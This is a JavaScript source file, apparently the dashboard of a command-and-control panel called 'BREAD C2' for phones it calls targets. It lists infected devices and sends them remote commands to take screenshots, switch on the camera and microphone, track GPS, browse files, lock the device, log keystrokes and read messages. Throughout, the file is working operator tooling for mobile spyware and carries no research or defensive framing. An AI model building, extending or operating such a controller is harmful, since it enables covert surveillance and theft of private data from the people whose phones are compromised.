// ================================================================
// BREAD C2 - Main Application (Dashboard & Control)
// ================================================================

import { API_BASE, WS_URL } from './config.js';
import { initSocket, sendCommandViaSocket } from './socket-client.js';

// ================================================================
// STATE GLOBAL
// ================================================================
let token = localStorage.getItem('token');
let currentTargets = [];

if (!token) {
    window.location.href = 'index.html';
}

// ================================================================
// LOGOUT
// ================================================================
window.logout = function() {
    localStorage.removeItem('token');
    localStorage.removeItem('api_base');
    window.location.href = 'index.html';
};

// ================================================================
// FETCH TARGETS (dari REST API)
// ================================================================
async function loadTargets() {
    try {
        const res = await fetch(API_BASE + '/api/targets', {
            headers: { 'Authorization': `Bearer ${token}` }
        });
        if (res.status === 401) { logout(); return; }
        const data = await res.json();
        currentTargets = data;
        renderTargets(data);
        updateStats(data);
        updateChart(data);
    } catch (e) {
        console.error('Load targets error:', e);
        document.getElementById('recentCommands').innerText = '[error] Failed to load targets';
    }
}
window.loadTargets = loadTargets; // agar bisa dipanggil dari onclick

// ================================================================
// RENDER TARGETS
// ================================================================
function renderTargets(targets) {
    const body = document.getElementById('targetBody');
    if (!body) return;
    body.innerHTML = '';
    if (!targets || targets.length === 0) {
        body.innerHTML = '<tr><td colspan="7" class="text-center text-muted">No targets registered yet.</td></tr>';
        return;
    }
    targets.forEach(t => {
        const status = t.status === 'online' ? 'online' : 'offline';
        const row = document.createElement('tr');
        row.innerHTML = `
            <td><i class="bi bi-phone"></i> ${t.device_name || 'Unknown'}</td>
            <td><small>${t.uuid ? t.uuid.substring(0,12) + '…' : 'N/A'}</small></td>
            <td>${t.model || 'N/A'}</td>
            <td><span class="badge badge-${status}">${status.toUpperCase()}</span></td>
            <td>${t.battery || 0}%</td>
            <td>${t.last_seen || 'Never'}</td>
            <td>
                <button class="btn btn-sm btn-primary" onclick="controlTarget('${t.uuid}')">
                    <i class="bi bi-joystick"></i>
                </button>
                <button class="btn btn-sm btn-outline-info" onclick="viewTarget('${t.uuid}')">
                    <i class="bi bi-eye"></i>
                </button>
            </td>
        `;
        body.appendChild(row);
    });
}

// ================================================================
// UPDATE STATISTICS
// ================================================================
function updateStats(targets) {
    const total = targets.length;
    const online = targets.filter(t => t.status === 'online').length;
    const offline = total - online;
    document.getElementById('totalTargets').innerText = total;
    document.getElementById('onlineTargets').innerText = online;
    document.getElementById('offlineTargets').innerText = offline;
    // Commands executed (bisa diambil dari API terpisah, tapi untuk demo kita set 0)
    document.getElementById('totalCommands').innerText = '0';
}

// ================================================================
// CHART UPDATER
// ================================================================
let chartInstance = null;
function updateChart(targets) {
    const ctx = document.getElementById('activityChart');
    if (!ctx) return;
    // Sederhana: kita buat data dummy berdasarkan status online/offline
    const onlineCount = targets.filter(t => t.status === 'online').length;
    const offlineCount = targets.length - onlineCount;
    if (chartInstance) {
        chartInstance.data.datasets[0].data = [onlineCount, offlineCount];
        chartInstance.update();
        return;
    }
    chartInstance = new Chart(ctx, {
        type: 'doughnut',
        data: {
            labels: ['Online', 'Offline'],
            datasets: [{
                data: [onlineCount, offlineCount],
                backgroundColor: ['#00d4ff', '#4a5568'],
                borderColor: '#0a0e17',
                borderWidth: 2
            }]
        },
        options: {
            responsive: true,
            plugins: {
                legend: { labels: { color: '#c8d6e5' } }
            }
        }
    });
}

// ================================================================
// CONTROL TARGET (kirim perintah via REST)
// ================================================================
window.controlTarget = function(uuid) {
    const cmd = prompt(`Commands for ${uuid}:\n1: screenshot\n2: camera\n3: gps\n4: mic\n5: file_explorer\n6: lockdown\n7: keylog\n8: read_messages\n\nEnter command number:`);
    if (!cmd) return;
    const commands = ['screenshot', 'camera', 'gps', 'mic', 'file_explorer', 'lockdown', 'keylog', 'read_messages'];
    const selected = commands[parseInt(cmd) - 1];
    if (!selected) return alert('Invalid command number');
    
    fetch(API_BASE + '/api/commands', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${token}`
        },
        body: JSON.stringify({ target_uuid: uuid, command: selected, params: {} })
    })
    .then(r => r.json())
    .then(d => {
        if (d.command_id) {
            alert(`✅ Command sent! ID: ${d.command_id}\nStatus: ${d.status}`);
            // Update terminal
            document.getElementById('recentCommands').innerHTML = `[${new Date().toLocaleTimeString()}] Command ${selected} sent to ${uuid.substring(0,8)} (ID: ${d.command_id})`;
        } else {
            alert('❌ Error: ' + (d.error || 'Unknown'));
        }
    })
    .catch(e => alert('Network error: ' + e.message));
};

// ================================================================
// VIEW TARGET DETAIL (redirect ke target.html)
// ================================================================
window.viewTarget = function(uuid) {
    window.location.href = 'target.html?uuid=' + encodeURIComponent(uuid);
};

// ================================================================
// INIT SOCKET (real-time updates)
// ================================================================
function initRealTime() {
    const socket = initSocket(WS_URL);
    socket.on('target_update', (data) => {
        // Ketika backend mengirim update (misal target baru atau status berubah)
        loadTargets(); // refresh ulang
    });
    socket.on('command_result', (data) => {
        // Tampilkan hasil di terminal
        const terminal = document.getElementById('recentCommands');
        if (terminal) {
            terminal.innerHTML = `[${new Date().toLocaleTimeString()}] Result: ${JSON.stringify(data)}`;
        }
    });
    // Simpan socket untuk digunakan nanti
    window._socket = socket;
}

// ================================================================
// START
// ================================================================
document.addEventListener('DOMContentLoaded', () => {
    loadTargets();
    setInterval(loadTargets, 15000); // refresh setiap 15 detik
    initRealTime();
});
